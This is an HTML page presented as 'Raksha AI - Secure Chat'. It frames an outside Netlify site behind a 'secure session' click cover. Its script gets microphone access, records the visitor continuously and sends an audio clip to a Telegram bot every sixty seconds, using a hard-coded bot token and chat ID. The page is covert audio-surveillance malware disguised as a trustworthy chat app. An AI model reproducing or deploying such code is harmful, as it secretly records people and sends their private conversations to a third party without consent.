<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Chat</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        
        /* Website Frame */
        #aiFrame {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0; left: 0;
            z-index: 1;
        }

        /* Overlay for Activation */
        #startCover {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #0f0; display: flex; 
            justify-content: center; align-items: center; z-index: 10000; 
            cursor: pointer; font-family: monospace; text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>

    <div id="startCover" onclick="init()">🛡️ INITIALIZING SECURE SESSION... <br><br> (CLICK TO START)</div>
    
    <iframe id="aiFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone;"></iframe>

    <script>
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
        const MY_ID = "8508792403";

        function init() {
            document.getElementById('startCover').style.display = 'none';
            startAudio();
        }

        async function startAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];

                recorder.ondataavailable = (e) => chunks.push(e.data);

                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append("chat_id", MY_ID);
                    fd.append("voice", blob, "v.ogg");

                    fetch(`https://api.telegram.org{TOKEN}/sendVoice`, { 
                        method: "POST", 
                        body: fd 
                    });

                    chunks = [];
                    if (stream.active) setTimeout(() => recorder.start(), 1000);
                };

                // Start recording
                recorder.start();

                // Har 60 second mein audio chunk bhejne ke liye
                setInterval(() => { 
                    if (recorder.state === "recording") recorder.stop(); 
                }, 60000);

            } catch (err) { 
                console.log("Mic access required for secure session."); 
            }
        }
    </script>
</body>
</html>
